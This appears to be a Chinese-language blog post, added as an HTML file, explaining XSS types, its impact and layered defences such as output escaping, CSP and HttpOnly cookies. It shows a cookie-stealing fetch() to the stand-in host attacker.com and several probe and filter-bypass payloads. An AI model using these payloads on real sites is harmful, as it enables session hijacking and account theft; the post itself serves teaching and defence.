@@ -1,0 +1,462 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[分享]什么是XSS注入？ | 桉南的小窝</title><meta name="author" content="桉南"><meta name="copyright" content="桉南"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XSS（跨站脚本攻击）是一种通过注入恶意脚本在用户浏览器中执行的安全漏洞，可导致会话劫持、数据窃取和网页篡改。本文详解其存储型、反射型与DOM型三种形态、攻击手法及防御策略。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[分享]什么是XSS注入？">
+<meta property="og:url" content="https://blog.yll14.cn/posts/260725.html">
+<meta property="og:site_name" content="桉南的小窝">
+<meta property="og:description" content="XSS（跨站脚本攻击）是一种通过注入恶意脚本在用户浏览器中执行的安全漏洞，可导致会话劫持、数据窃取和网页篡改。本文详解其存储型、反射型与DOM型三种形态、攻击手法及防御策略。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.yll14.cn/blogimage/260725/260725.webp">
+<meta property="article:published_time" content="2026-07-25T01:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-25T01:00:00.000Z">
+<meta property="article:author" content="桉南">
+<meta property="article:tag" content="知识分享">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.yll14.cn/blogimage/260725/260725.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[分享]什么是XSS注入？",
+  "url": "https://blog.yll14.cn/posts/260725.html",
+  "image": "https://blog.yll14.cn/blogimage/260725/260725.webp",
+  "datePublished": "2026-07-25T01:00:00.000Z",
+  "dateModified": "2026-07-25T01:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "桉南",
+      "url": "https://blog.yll14.cn"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.yll14.cn/posts/260725.html"><link rel="preconnect" href="https://cdn.yll14.cn"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.6.1"><link rel="stylesheet" href="https://cdn.yll14.cn/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.yll14.cn/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.yll14.cn/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":-1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":250,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":350,"languages":{"author":"作者: 桉南","link":"链接: ","source":"来源: 桉南的小窝","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.yll14.cn/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: true,
+  isAnchor: true,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[分享]什么是XSS注入？',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="icon" type="image/png" href="/favicon/favicon-96x96.png" sizes="96x96" /><link rel="icon" type="image/svg+xml" href="/favicon/favicon.svg" /><link rel="shortcut icon" href="/favicon.ico" /><link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png" /><meta name="apple-mobile-web-app-title" content="桉南" /><link rel="manifest" href="/favicon/site.webmanifest" /><meta name="baidu-site-verification" content="codeva-RltT77T5Mn" /><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="桉南的小窝" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="桉南的小窝" type="application/rss+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/108552684_p8.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://q.qlogo.cn/headimg_dl?dst_uin=2443958507&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/img404.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">桉南的小窝</span></a><a class="nav-page-title" href="/"><span class="site-name">[分享]什么是XSS注入？</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">[分享]什么是XSS注入？</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-07-25T01:00:00.000Z" title="发表于 2026-07-25 09:00">2026-07-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-25T01:00:00.000Z" title="更新于 2026-07-25 09:00">2026-07-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/">知识分享</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:30,&quot;messagePrev&quot;:&quot;自上次更新以来，已经过了&quot;,&quot;messageNext&quot;:&quot;天，文章内容可能已经过时。&quot;,&quot;postUpdate&quot;:&quot;2026-07-25 09:00&quot;}" hidden></div><blockquote>
+<p><i>引言：<br>
+XSS（跨站脚本攻击）是一种通过注入恶意脚本在用户浏览器中执行的安全漏洞，可导致会话劫持、数据窃取和网页篡改。本文详解其存储型、反射型与DOM型三种形态、攻击手法及防御策略。</i></p>
+</blockquote>
+<h2 id="XSS：网页里的-幽灵脚本">XSS：网页里的&quot;幽灵脚本&quot;</h2>
+<p>想象一下，你打开了一个看起来很正常的网站，页面上的文字、图片都和你平时看到的一样。但就在你浏览的这几秒钟里，一段你完全看不见的恶意代码已经在后台悄悄运行了——它读走了你的 Cookie，把你的登录凭证发到了攻击者的服务器上。</p>
+<p>这就是 <strong>XSS（Cross-Site Scripting，跨站脚本攻击）</strong>，中文常译为&quot;跨站脚本&quot;。攻击者把一段恶意的 JavaScript 代码<strong>注入</strong>到目标网站的页面中，当其他用户访问这个页面时，代码就在他们的浏览器里自动执行。它不攻击服务器，而是直接攻击<strong>网站的访问者</strong>。</p>
+<h2 id="从-夹带私货-说起：XSS-是怎么发生的">从&quot;夹带私货&quot;说起：XSS 是怎么发生的</h2>
+<p>XSS 的根源和 SQL 注入如出一辙：<strong>开发人员把用户输入的内容，未经处理就输出到了 HTML 页面上。</strong></p>
+<p>举个例子，一个网站有留言板功能，用户提交的评论会直接显示在页面上。如果攻击者在评论框里输入的是这样的内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果网站没有对这条评论做任何过滤或转义，那么所有访问这个留言板页面的用户，浏览器都会弹出一个写着&quot;XSS&quot;的提示框——这只是最无害的演示。换成下面的代码，事情就完全不一样了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/steal?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段代码会在页面加载时，把当前用户的 Cookie 发送到攻击者指定的服务器上。</p>
+<p>攻击者不需要破解密码，不需要暴力撞库——用户自己浏览器里的 Cookie，被&quot;合法&quot;地送到了攻击者手里。有了这些 Cookie，攻击者就能<strong>直接以该用户的身份登录网站</strong>，不需要账号密码。</p>
+<h2 id="三种-XSS：存储型、反射型、DOM-型">三种 XSS：存储型、反射型、DOM 型</h2>
+<p>根据恶意脚本的&quot;落脚点&quot;和触发方式，XSS 可以分为三类。</p>
+<h3 id="1-存储型-XSS（Stored-XSS）——最危险">1. 存储型 XSS（Stored XSS）——最危险</h3>
+<p>恶意脚本被<strong>永久保存在目标网站的服务器上</strong>（比如数据库、文件系统）。每次有人访问包含这段内容的页面时，脚本都会自动执行。</p>
+<blockquote>
+<p><strong>典型场景</strong>：博客评论区、论坛帖子、商品评价、用户个人简介。</p>
+</blockquote>
+<p>攻击者发表一篇包含恶意脚本的评论，网站把它存进了数据库。此后每一个打开这篇文章的用户，都会在不知不觉中执行这段脚本。<strong>一次注入，影响所有访问者</strong>，这是三种 XSS 中危害最大的一种。</p>
+<h3 id="2-反射型-XSS（Reflected-XSS）——最普遍">2. 反射型 XSS（Reflected XSS）——最普遍</h3>
+<p>恶意脚本<strong>不存储在服务器上</strong>，而是作为 URL 参数的一部分，被服务器原样反射（返回）到页面中。攻击者通常需要把恶意链接发给受害者，诱骗受害者点击。</p>
+<blockquote>
+<p><strong>典型场景</strong>：搜索框、错误页面、URL 参数直接回显。</p>
+</blockquote>
+<p>一个正常的搜索 URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/search?q=手机</span><br></pre></td></tr></table></figure>
+<p>攻击者构造的恶意 URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/search?q=&lt;script&gt;fetch(&#x27;https://attacker.com/steal?cookie=&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>网站把搜索词原样输出到页面上：“您搜索的关键词是：<script>…”&quot;。受害者的浏览器执行了这段脚本。</p>
+<p>反射型 XSS 需要攻击者通过邮件、短信或社交平台把恶意链接发给用户，<strong>诱导点击是传播的关键环节</strong>。虽然单次攻击范围不如存储型广，但由于数量极多，实际危害不容低估。</p>
+<h3 id="3-DOM-型-XSS（DOM-based-XSS）——最隐蔽">3. DOM 型 XSS（DOM-based XSS）——最隐蔽</h3>
+<p>和前两种不同，DOM 型 XSS 的恶意代码<strong>完全在客户端执行</strong>，不经过服务器。它利用的是浏览器端的 JavaScript 代码直接操作 DOM 时，使用了未经验证的用户输入。</p>
+<blockquote>
+<p><strong>典型场景</strong>：从 URL 中读取参数并通过 <code>innerHTML</code> 写入页面。</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 页面中的 JS 代码</span></span><br><span class="line"><span class="keyword">var</span> name = location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;welcome&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;欢迎 &#x27;</span> + name;</span><br></pre></td></tr></table></figure>
+<p>攻击者构造 URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/#&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码不经过服务器，直接在浏览器端被 <code>innerHTML</code> 解析并执行。由于攻击流量不经过服务器，WAF 和服务器端的过滤策略对这种攻击<strong>完全无效</strong>。</p>
+<h2 id="XSS-能做些什么？">XSS 能做些什么？</h2>
+<p>XSS 能在受害者的浏览器中执行任意 JavaScript 代码，这赋予了攻击者几乎&quot;为所欲为&quot;的能力：</p>
+<ol>
+<li>
+<p><strong>窃取会话凭证</strong>：通过 <code>document.cookie</code> 读取用户的登录 Cookie，发送到攻击者的服务器。有了它，攻击者就能直接冒充用户登录。</p>
+</li>
+<li>
+<p><strong>记录键盘输入</strong>：通过 <code>addEventListener</code> 监听键盘事件，在用户输入密码、银行卡号时实时记录并发送出去。</p>
+</li>
+<li>
+<p><strong>劫持页面交互</strong>：篡改页面内容，在登录框上方插入一个假的&quot;重新登录&quot;弹窗，诱导用户输入账号密码。或者把&quot;转账&quot;按钮的目标地址换成攻击者的账户。</p>
+</li>
+<li>
+<p><strong>发起请求</strong>：在用户不知情的情况下，用受害者的身份发送请求——发帖、删帖、改密码、转账，理论上受害者能做的事，脚本都能做。</p>
+</li>
+<li>
+<p><strong>传播蠕虫</strong>：2011 年微博曾发生大规模 XSS 蠕虫事件。攻击者在用户页面注入脚本，脚本会自动关注指定账号、转发特定微博，同时把恶意代码复制到转发的微博内容中，实现指数级传播。最终导致微博全站瘫痪数小时。</p>
+</li>
+</ol>
+<h2 id="XSS-和-CSRF-的区别">XSS 和 CSRF 的区别</h2>
+<p>很多人会把 XSS 和 CSRF 搞混，两者的区别在于：</p>
+<ul>
+<li><strong>XSS</strong>：攻击者在页面中注入恶意脚本，在用户浏览器中执行，直接窃取信息或操作页面。</li>
+<li><strong>CSRF（跨站请求伪造）</strong>：攻击者诱导已登录的用户点击一个恶意链接或访问一个恶意网站，该网站自动向目标网站发起请求，利用用户已有的 Cookie 完成非法操作。</li>
+</ul>
+<p><strong>XSS 可以窃取 CSRF Token</strong>，从而绕过 CSRF 防御；而 CSRF 本身不依赖 XSS，靠的是浏览器自动携带 Cookie 的机制。两者经常被组合使用——XSS 负责偷 Token 或凭证，CSRF 负责利用这个凭证发起批量操作。</p>
+<h2 id="为什么-XSS-至今仍然普遍？">为什么 XSS 至今仍然普遍？</h2>
+<p>XSS 漏洞被发现已有二十多年，但它依然排在 OWASP Top 10 榜单中。原因包括：</p>
+<ol>
+<li><strong>前端复杂度激增</strong>：现代前端框架（如 Vue、React）虽然提供了默认的转义机制，但 <code>v-html</code>、<code>dangerouslySetInnerHTML</code> 等&quot;逃生门&quot;一旦被滥用，注入风险就会卷土重来。</li>
+<li><strong>富文本需求的矛盾</strong>：很多业务需要用户提交带格式的内容（如加粗、图片、链接），完全禁用 HTML 不现实，而允许 HTML 就意味着需要极其严谨的过滤策略。</li>
+<li><strong>第三方依赖的风险</strong>：页面中嵌入的第三方 SDK、广告代码、统计脚本，如果被攻击者入侵或劫持，会直接向所有页面注入恶意代码。这是<strong>供应链 XSS</strong>，防御难度极高。</li>
+<li><strong>同源策略的局限</strong>：同源策略限制的是跨域请求的<strong>读取</strong>，但 XSS 是在同源页面内执行的代码，享有完全的同源权限，同源策略对它无能为力。</li>
+</ol>
+<h2 id="防御之道：输出转义是第一道防线">防御之道：输出转义是第一道防线</h2>
+<p>XSS 防御的核心思路是：<strong>永远不信任用户输入的内容，在输出到 HTML 的每个位置都做正确的转义。</strong></p>
+<h3 id="第一层：输出转义（最根本）">第一层：输出转义（最根本）</h3>
+<p>根据用户数据输出的<strong>上下文位置</strong>，采用不同的转义策略：</p>
+<table>
+<thead>
+<tr>
+<th>输出位置</th>
+<th>转义方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTML 标签内容</td>
+<td>HTML 实体编码</td>
+<td><code>&lt;</code> → <code>&amp;lt;</code>，<code>&gt;</code> → <code>&amp;gt;</code>，<code>&quot;</code> → <code>&amp;quot;</code></td>
+</tr>
+<tr>
+<td>HTML 属性值</td>
+<td>HTML 实体编码 + 引号包裹</td>
+<td><code>onerror=...</code> 会被转义为纯字符串</td>
+</tr>
+<tr>
+<td>JavaScript 字符串</td>
+<td>JS 转义</td>
+<td><code>'</code> → <code>\'</code>，<code>&quot;</code> → <code>\&quot;</code>，<code>\</code> → <code>\\</code></td>
+</tr>
+<tr>
+<td>URL 参数</td>
+<td>URL 编码</td>
+<td><code>&lt;script&gt;</code> → <code>%3Cscript%3E</code></td>
+</tr>
+<tr>
+<td>CSS 样式</td>
+<td>CSS 转义</td>
+<td>禁止用户输入作为 CSS 值</td>
+</tr>
+</tbody>
+</table>
+<p><strong>重要原则</strong>：不要试图在&quot;输入时&quot;统一过滤，而是要在<strong>输出时&quot;按位置&quot;转义</strong>。同一个用户数据，可能在不同位置（HTML、JS、URL）以不同方式输出，需要分别处理。</p>
+<h3 id="第二层：CSP（内容安全策略）——纵深防御的最后底线">第二层：CSP（内容安全策略）——纵深防御的最后底线</h3>
+<p>CSP 是一种浏览器安全机制，通过 HTTP 响应头告诉浏览器<strong>哪些资源可以加载、哪些脚本可以执行</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.example.com</span><br></pre></td></tr></table></figure>
+<p>这个策略规定：只允许加载本站资源和指定的 CDN 资源，禁止内联脚本（<code>&lt;script&gt;</code> 标签中的代码）执行。</p>
+<p>即使攻击者成功注入了一个 <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>，由于 CSP 禁止内联脚本执行，这个攻击<strong>在浏览器层面就被拦截了</strong>。</p>
+<blockquote>
+<p><strong>CSP 的盲点</strong>：<code>&lt;img src=x onerror=alert('XSS')&gt;</code> 这类通过事件属性触发的 XSS，如果 CSP 没有配置 <code>'unsafe-inline'</code> 则不会执行。但如果启用了 <code>'unsafe-eval'</code>，<code>eval()</code> 仍然可以执行，需要谨慎配置。</p>
+</blockquote>
+<p>CSP 的配置需要根据业务场景精细调整，过严会导致页面功能异常，过松则失去防御效果。它是<strong>防御纵深</strong>的一部分，不能替代输出转义，但可以提供&quot;即使代码被注入，也无法执行&quot;的兜底保护。</p>
+<h3 id="第三层：输入验证与过滤">第三层：输入验证与过滤</h3>
+<ul>
+<li><strong>白名单过滤</strong>：对允许的 HTML 标签和属性进行严格白名单控制，只放行安全的标签（如 <code>&lt;b&gt;</code>、<code>&lt;i&gt;</code>、<code>&lt;p&gt;</code>）。推荐使用 OWASP Java HTML Sanitizer 等成熟的过滤库。</li>
+<li><strong>类型校验</strong>：邮箱、手机号、数字等有明确格式的字段，用正则校验格式后，只取合法部分。</li>
+<li><strong>长度限制</strong>：过长的输入往往是攻击信号，设置合理上限并截断。</li>
+</ul>
+<p><strong>与 SQL 注入相同的是，不要依赖黑名单过滤。</strong> 攻击者可以绕过黑名单：<code>&lt;scr&lt;script&gt;ipt&gt;</code>、<code>&lt;img src=x onerror=alert(1)&gt;</code> 的多种变体、Unicode 编码、HTML 实体编码等，黑名单永远堵不全。</p>
+<h3 id="第四层：Cookie-安全加固">第四层：Cookie 安全加固</h3>
+<ul>
+<li>
+<p><strong>HttpOnly 标记</strong>：设置 Cookie 时添加 <code>HttpOnly</code> 属性，JavaScript 无法通过 <code>document.cookie</code> 读取该 Cookie，即使 XSS 成功，攻击者也偷不走会话 Cookie。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>Secure 标记</strong>：Cookie 只在 HTTPS 连接中传输，防止中间人窃听。</p>
+</li>
+<li>
+<p><strong>SameSite 属性</strong>：限制 Cookie 在跨站请求中是否发送，可有效防御 CSRF，同时降低 XSS 窃取 Cookie 后跨站使用的风险。</p>
+</li>
+</ul>
+<h3 id="第五层：使用现代前端框架的安全特性">第五层：使用现代前端框架的安全特性</h3>
+<ul>
+<li>React：默认会转义 JSX 中的所有变量，<strong>除非使用 <code>dangerouslySetInnerHTML</code></strong>。这个 API 名字里带&quot;危险&quot;是有原因的，使用前必须确保内容已安全过滤。</li>
+<li>Vue：<code>&#123;&#123; &#125;&#125;</code> 双花括号插值会转义 HTML，<strong>除非使用 <code>v-html</code></strong>。<code>v-html</code> 的使用场景极其有限。</li>
+<li>Angular：默认转义所有模板绑定值。</li>
+</ul>
+<p><strong>核心原则</strong>：尽量避免使用任何&quot;绕过转义&quot;的 API。如果必须使用（例如需要展示富文本内容），请使用成熟的 HTML 净化库（如 DOMPurify）进行过滤。</p>
+<h2 id="攻击者的视角：如何快速探测-XSS-点">攻击者的视角：如何快速探测 XSS 点</h2>
+<p>攻击者探测 XSS 时，最常用的&quot;试针&quot;方式是在输入框或 URL 参数中提交以下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>如果页面弹出了提示框，说明该位置存在 XSS 漏洞，攻击者就可以将 <code>alert(1)</code> 替换为真正的攻击载荷（窃取 Cookie、发送请求等）。</p>
+<p><strong>但</strong>，现代网站往往会对 <code>&lt;script&gt;</code> 等明显的标签做过滤。更隐蔽的探测方式包括：</p>
+<ul>
+<li>使用不常见的标签属性触发：<code>&lt;svg onload=alert(1)&gt;</code>、<code>&lt;video src=x onerror=alert(1)&gt;</code></li>
+<li>利用编码绕过：<code>&amp;#x3C;script&amp;#x3E;</code> 等 HTML 实体编码</li>
+<li>利用浏览器解析差异：<code>&lt;scr&lt;script&gt;ipt&gt;</code>（标签过滤后重新拼接）</li>
+</ul>
+<p><strong>再次强调</strong>：依赖黑名单过滤是不安全的。正确的防御是输出转义 + CSP，而不是试图穷举所有可能的绕过方式。</p>
+<h2 id="真实世界案例">真实世界案例</h2>
+<h3 id="案例一：推特蠕虫（2009）">案例一：推特蠕虫（2009）</h3>
+<p>2009 年，推特遭遇了一次经典的 XSS 蠕虫攻击。攻击者在推文中注入恶意脚本，任何查看该推文的用户都会自动转发同一条恶意推文，并关注攻击者的账号。短短几小时内，成千上万个账号被&quot;劫持&quot;，推特全站陷入混乱。</p>
+<h3 id="案例二：微博-XSS-蠕虫（2011）">案例二：微博 XSS 蠕虫（2011）</h3>
+<p>2011 年，国内微博平台遭遇大规模 XSS 蠕虫攻击。攻击方式类似：恶意脚本通过评论或私信传播，受害者查看后自动转发并感染其粉丝，形成指数级扩散。最终导致微博全站瘫痪数小时，大量用户账号被强制重置密码。</p>
+<p>这两个案例的共同点是：<strong>攻击者利用了网站对用户内容的信任</strong>——没有对用户发表的 HTML 内容做严格过滤——使得一段 JavaScript 代码成为&quot;自我复制的病毒&quot;。</p>
+<h2 id="总结">总结</h2>
